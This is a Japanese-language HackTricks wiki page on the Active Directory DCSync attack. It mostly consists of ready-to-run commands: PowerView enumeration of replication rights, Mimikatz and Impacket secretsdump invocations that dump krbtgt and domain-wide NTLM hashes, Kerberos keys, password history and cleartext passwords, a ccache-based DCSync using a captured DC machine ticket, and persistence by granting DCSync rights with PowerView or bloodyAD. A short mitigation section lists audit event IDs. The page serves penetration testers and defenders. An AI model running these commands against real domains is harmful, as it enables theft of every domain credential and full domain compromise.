# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** permissionは、domain自体に対する以下の権限を持っていることを意味します: **DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および **Replicating Directory Changes In Filtered Set**。<sup>[[3]](#references)</sup>

**DCSyncに関する重要な注意事項:**

- **DCSync attackはDomain Controllerの動作をシミュレートし、Directory Replication Service Remote Protocol (MS-DRSR)を使用して、他のDomain Controllerに情報のreplicateを要求します**。MS-DRSRは有効かつ必要なActive Directoryの機能であるため、停止または無効化することはできません。
- デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、Domain Controllers** groupsのみが必要なprivilegesを持っています。
- 実際には、**full DCSync**にはdomain naming contextに対する **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** が必要です。`DS-Replication-Get-Changes-In-Filtered-Set`は、通常これらと併せてdelegateされますが、単独ではfull krbtgt dumpよりも、**confidential / RODC-filtered attributes**（例: legacy LAPS-style secrets）のsyncに関係します。<sup>[[2]](#references)</sup>
- アカウントのpasswordがreversible encryptionで保存されている場合、Mimikatzではpasswordをclear textで返すoptionを利用できます。

### Enumeration

`powerview`を使用して、これらのpermissionsを持つユーザーを確認します:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
DCSync 権限を持つ**non-default principals**に焦点を当てる場合は、組み込みの replication-capable groups を除外し、予期しない権限付与先のみを確認します。
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### ローカルで Exploit
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートからExploitする
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
実践的なスコープを限定した例:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### captureしたDC machine TGT (ccache)を使用したDCSync

unconstrained-delegation export-mode scenariosでは、Domain Controller machine TGT（例: `DC1$@DOMAIN` for `krbtgt@DOMAIN`）をcaptureできる場合があります。その後、その ccache を使用してDCとしてauthenticateし、パスワードなしでDCSyncを実行できます。<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
運用上の注意:

- **Impacket's Kerberos path touches SMB first** before the DRSUAPI call. 環境で **SPN target name validation** が適用されている場合、完全な dump は `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user` で失敗する可能性があります。
- その場合は、先に対象 DC の **`cifs/<dc>`** service ticket を要求するか、必要なアカウントに対して **`-just-dc-user`** にフォールバックしてください。
- 下位の replication rights しかない場合でも、LDAP/DirSync-style syncing によって、完全な krbtgt replication を行わずに **confidential** または **RODC-filtered** attributes（例: 古い `ms-Mcs-AdmPwd`）が漏えいする可能性があります。<sup>[[2]](#references)</sup>

`-just-dc` は 3 つのファイルを生成します:

- **NTLM hashes** を含むファイル
- **Kerberos keys** を含むファイル
- [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) が有効になっているアカウントについて、NTDS から取得した cleartext passwords を含むファイル。reversible encryption が有効なユーザーは、次のコマンドで取得できます。

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

domain admin である場合、`powerview` を使って任意のユーザーにこの permissions を付与できます:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linuxオペレーターは`bloodyAD`で同じことを実行できます:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
次に、**ユーザーに3つの権限が正しく割り当てられたかを確認**できます。確認するには、以下の出力で探してください（"ObjectType" フィールド内に権限名が表示されるはずです）。
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662（オブジェクトの Audit Policy を有効にする必要があります）– オブジェクトに対して操作が実行された<sup>[[4]](#references)</sup>
- Security Event ID 5136（オブジェクトの Audit Policy を有効にする必要があります）– directory service オブジェクトが変更された
- Security Event ID 4670（オブジェクトの Audit Policy を有効にする必要があります）– オブジェクトの Permissions が変更された
- AD ACL Scanner - ACL のレポートを作成し、比較します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replication Get-Changes と Get-Changes-In-Filtered-Set の活用](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Domain Controller から Password Hashes を Dump する](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
